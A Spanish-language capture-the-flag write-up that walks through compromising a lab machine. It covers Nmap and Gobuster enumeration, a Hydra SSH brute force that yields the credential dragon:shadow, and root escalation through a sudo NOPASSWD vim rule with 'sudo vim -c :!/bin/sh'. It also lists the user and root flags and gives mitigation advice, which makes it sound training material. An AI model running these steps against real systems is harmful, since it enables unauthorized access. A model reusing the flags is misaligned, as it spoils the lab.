# 🐉 Laboratorio: Compromiso Total de "La Máquina del Dragón" (The Hackers Labs - ID 124)

Este documento detalla el análisis de vulnerabilidades y el proceso de Penetration Test (Pentest) realizado sobre la máquina objetivo `10.0.100.5`. El ejercicio culminó con éxito, logrando el **acceso root** y la obtención de las flags de usuario y administrador.

## 1. 📌 Resumen Ejecutivo

El objetivo fue comprometido debido a fallos críticos en la gestión de credenciales y la configuración de privilegios.

| Estado del Objetivo | Tipo de Compromiso | Vulnerabilidad Crítica | Impacto |
| :--- | :--- | :--- | :--- |
| **COMPROMETIDO** | Control Total (Root) | Mala Configuración de **Sudo (VIM NOPASSWD)** | **CRÍTICO** |

**Banderas Obtenidas:**
* **User Flag:** `e1f9c2e8a1d8477f9b3f6cd298f9f3bd`
* **Root Flag:** `7a4d1b35eebf4aefa5f1b0198b0d6c17`

---

## 2. 🛡️ Metodología de Ataque (PTES/OSSTMM)

El ataque se ejecutó siguiendo una metodología estructurada, aunque la re-enumeración fue necesaria para demostrar un proceso exhaustivo.

### Fase A: Reconocimiento y Obtención de Acceso

| Paso | Tarea Clave | Herramienta | Resultado y Pista |
| :--- | :--- | :--- | :--- |
| **1.** | Escaneo de Servicios | `Nmap` | Puertos **22 (SSH)** y **80 (HTTP)** abiertos. |
| **2.** | Enumeración Web | `Gobuster` | Directorio `/secret` encontrado, conteniendo una **pista críptica** (`"Su nombre es la clave..."`). |
| **3.** | Explotación de Credenciales | `Hydra` | Descubrimiento de credenciales válidas por fuerza bruta: **`dragon:shadow`**. |

### Fase B: Post-Explotación y Escalada de Privilegios

| Paso | Tarea Clave | Herramienta | Resultado y Vector |
| :--- | :--- | :--- | :--- |
| **4.** | Acceso Inicial | `ssh` | Acceso como usuario `dragon` y obtención de `user.txt`. |
| **5.** | Detección de Vector | `sudo -l` | Identificación de la vulnerabilidad crítica: **`/usr/bin/vim` con permiso `NOPASSWD`**. |
| **6.** | Escalada de Privilegios | `sudo vim -c ...` | Ejecución del exploit de VIM para obtener una **shell de root (`#`)**. |
| **7.** | Impacto Final | `cat root.txt` | Lectura de la `root flag`, confirmando el compromiso total. |

---

## 3. 🚨 Análisis de Vulnerabilidades Encontradas

### 3.1. Vulnerabilidad Crítica: Mala Configuración de Sudo

* **Vector:** Escalada de Privilegios.
* **Descripción:** El usuario `dragon` estaba configurado en el archivo `sudoers` para ejecutar el editor **`vim` con privilegios de administrador (`root`) sin necesidad de contraseña**. VIM permite la inyección de comandos de *shell*, lo que permite al atacante obtener una *shell* de root directamente.

    ```bash
    # Evidencia de la configuración vulnerable:
    (ALL) NOPASSWD: /usr/bin/vim 
    
    # Comando de Explotación (GTFOBins):
    sudo vim -c ':!/bin/sh'
    ```

### 3.2. Vulnerabilidad Alta: Contraseña de Usuario Débil

* **Vector:** Autenticación Remota (SSH).
* **Descripción:** La contraseña del usuario **`dragon`** (`shadow`) estaba presente en diccionarios comunes (`rockyou.txt`). Esto expuso el servicio SSH a un ataque de fuerza bruta exitoso, concediendo el acceso inicial al sistema.

---

## 4. 📝 Recomendaciones de Seguridad (Mitigación)

Para evitar la repetición de este compromiso, se recomienda lo siguiente:

* **Gestión de Privilegios:**
    * **Revocar** el permiso `NOPASSWD` para binarios interactivos como `vim`, `nano`, y `more`.
    * Limitar estrictamente los comandos permitidos en `sudo` a aquellos que no permitan la evasión a una shell.

* **Política de Credenciales:**
    * Implementar una **política de contraseñas robusta** que cumpla con requisitos de complejidad y longitud (mínimo 14 caracteres).
    * Fomentar el uso de **autenticación por clave SSH** y deshabilitar la autenticación por contraseña si es posible.

---

## 5. 💻 Apéndice B: Registro Detallado de Comandos

| \# | Fase | Propósito | Comando Ejecutado |
| :--- | :--- | :--- | :--- |
| **1** | Reconocimiento | Escaneo de servicios. | `nmap -A -v -sC -sV 10.0.100.5` |
| **2** | Enumeración Web | Descubrir rutas. | `gobuster dir -u http://10.0.100.5 -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html` |
| **3** | Obtención Acceso | Ataque a SSH. | `hydra -l dragon -P /usr/share/wordlists/rockyou.txt.gz ssh://10.0.100.5 -t 4` |
| **4** | Post-Explotación | Conexión e `user.txt`. | `ssh dragon@10.0.100.5` seguido de `cat user.txt` |
| **5** | Revisión (Opcional) | Escaneo web exhaustivo. | `dirb http://10.0.100.5 /usr/share/wordlists/dirb/big.txt -X .php,.html,.txt` |
| **6** | Revisión (Opcional) | Auditoría de configuración. | `nikto -h 10.0.100.5` |
| **7** | Escalada | Buscar binarios SUID. | `find / -perm -4000 2>/dev/null` |
| **8** | Escalada | **Detectar vector crítico.** | `sudo -l` |
| **9** | Control Total | **Ejecutar el Exploit.** | `sudo vim -c ':!/bin/sh'` |
| **10**| Control Total | Obtención de `root.txt`. | `cat /root/root.txt` |
